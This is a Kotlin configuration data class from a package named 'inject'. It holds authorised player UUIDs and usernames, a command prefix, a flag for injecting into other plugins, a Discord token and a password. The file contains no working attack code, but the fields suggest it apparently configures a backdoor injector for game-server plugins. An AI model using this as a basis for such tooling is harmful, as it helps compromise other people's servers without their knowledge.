package com.tmquan2508.inject.config

import com.google.gson.annotations.SerializedName

data class Config(
    @SerializedName("authorized_uuids")
    val authorizedUuids: List<String> = emptyList(),

    @SerializedName("authorized_usernames")
    val authorizedUsernames: List<String> = emptyList(),

    @SerializedName("command_prefix")
    val commandPrefix: String = "!",

    @SerializedName("inject_into_other_plugins")
    val injectIntoOtherPlugins: Boolean = false,

    @SerializedName("display_debug_messages")
    val displayDebugMessages: Boolean = false,

    @SerializedName("discord_token")
    val discordToken: String = "",

    @SerializedName("password")
    val password: String = ""
)